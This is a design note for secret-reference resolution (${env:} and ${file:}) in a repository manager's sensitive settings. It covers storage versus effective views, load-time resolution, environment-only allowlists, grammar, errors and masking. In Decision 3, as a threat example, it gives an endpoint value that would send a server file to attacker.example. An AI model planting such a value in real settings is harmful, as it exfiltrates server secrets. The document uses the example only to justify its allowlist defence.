# Design

## Context

Eight text settings carry the `@Sensitive` annotation on main (`reposilite-backend/src/main/kotlin/.../api/SecretAnnotations.kt:27`):
the S3 endpoint, access key and secret key (`storage/s3/S3StorageProviderSettings.kt`), the mirror credential password and
the mirror HTTP proxy (`maven/application/MavenSettings.kt`), the LDAP bind password (`identity/login/ldap/LdapLoginSettings.kt`),
the OIDC client secret (`identity/login/oidc/OidcSettings.kt`) and the search user password (`auth/application/AuthenticationSettings.kt`).
The annotation only affects the settings API. `SettingsSecrets.mask` replaces a non-empty value with `********` when
`hideSettingsSecrets` is on, and `restore` keeps the stored value when the placeholder comes back.

The stored settings object is the same object that the consumers read. `SharedConfigurationFacade.getDomainSettings<T>().get()`
returns it, `renderConfiguration()` writes it to the database or the file, and `updateSharedSettings` and `updateDomain` diff it
for the audit trail. A resolved value therefore cannot simply replace the stored one, because it would then be written back.

## Decisions

### 1. Two views of one document: raw for storage, effective for consumers

The facade keeps the document as it was written, with literal references. Each domain also has an effective view, a copy of the
settings in which every reference in a `@Sensitive` string is replaced by its value. The effective view is rebuilt whenever the
document is loaded. Consumers (S3 client, LDAP, OIDC, mirror client and proxy) read the effective view.

Rendering, the settings API, the audit diff, the debug dump in `SettingsSecrets.redactDocument` and every log line read the raw
view only. A consumer that still reads the raw view would fail visibly, because `${env:...}` is not a valid key or password. It
would not leak the value.

Rejected: resolving in each consumer. There are six consumer sites and a missed one would not be caught by a type. Rejected:
storing the resolved value and keeping the reference only in the API. That writes the secret back into the database or the file,
which is what this change exists to avoid.

### 2. Resolution happens on load, not per request

A document is resolved at start, on each reload of the shared configuration and when a newer document is read from the database.
A rotated file takes effect at the next of these points, which matches the rule for local settings: a changed secret takes effect
at the next load. Reading a file for every request would make a secret that is missing for one moment fail one request in the
middle of a download, and it would put file I/O on the artifact path.

### 3. The switch and the allowlists come from the environment only

`INGOT_SETTINGS_SECRET_REFERENCES`, `INGOT_SETTINGS_SECRET_ENV` and `INGOT_SETTINGS_SECRET_FILES` are read from the process
environment at start, not from `configuration.cdn` and not from the shared document. The reason is the settings API: anyone who
can write a settings domain can write an endpoint such as `https://attacker.example/${file:/app/data/configuration.cdn}`. Without
an allowlist fixed by the operator, a settings writer could send any file or variable that the server process can read to a host
of their choice. With the lists in the environment, a writer can only use names the operator has already allowed.

The lists are checked when the reference is parsed and again when it is resolved. File paths are canonicalised before the check, so
`..` and symbolic links cannot leave an allowed directory. An empty list refuses every reference of that kind.

### 4. Reference grammar

Only `${env:NAME}` and `${file:PATH}` are references, and only inside a `@Sensitive` string. Any other `${` text is literal. `$${`
stands for a literal `${`, so a password that contains `${env:` is written as `$${env:`. `NAME` is a variable name without `=` or
whitespace. `PATH` is absolute. A reference that is not closed, has an empty name or path, or uses a name or path outside the
allowlist is an error. It is not kept as literal text, because a silent literal would turn into a wrong credential.

The grammar is deliberately not the one of `add-file-secrets`, which only reads whole variables. Values in this change are
composed (an endpoint with credentials, a proxy string with a login and a password), so references can sit inside a value.

### 5. Errors name the reference, never the value

A failed resolution produces a message with the domain, the property path (for example `maven.repositories[releases].storageProvider.secretKey`),
the kind of reference and the name or path. It never contains the value of a variable or the content of a file, and a file that
is not valid UTF-8 is reported as such without its bytes. The start failure and the reload error are logged through the existing
failure facade and the journalist. The HTTP answer for a write is `400` in the `ErrorResponse` shape, the status that
`SharedConfigurationFacade.updateDomain` already uses for a rejected body.

### 6. Failure policy

| Moment | Reference cannot be resolved | Effect |
|---|---|---|
| Start | Start stops for this instance | Same as a broken shared configuration today. `--ignore-shared-configuration-errors` starts with defaults as it does now |
| Reload or refresh | The new document is not applied | The previous effective view stays, one error is logged |
| Write through the API | The write is rejected | `400` names the field and the reference. Nothing is stored |

A write is refused when a reference cannot be resolved now, so the stored document never names a reference that the instance
that wrote it cannot read. Instances that share a document may still differ, because each resolves against its own environment and
mounts. That is an operator matter and is stated in the documentation.

### 7. Masking

With the switch on, a value that is a reference is not replaced by `********`, because the reference is not a secret. A value
that contains a literal secret next to a reference is still masked. With the switch off, `SettingsSecrets` behaves as before, so a
reference is masked like any other text.

## Risks

- A reload that changes a reference to a file that exists but holds an old value is not detectable. Operators who rotate need
  the reload to be triggered. The documentation names this.
- The effective view doubles the in-memory copy of the sensitive settings. Each copy is small (a handful of strings).
- A consumer added later that reads the raw view will not fail with a secret. A test per consumer (tasks 5.1) pins the effective view.
- A future change that enables the switch by default would need a new decision. This change does not do it.
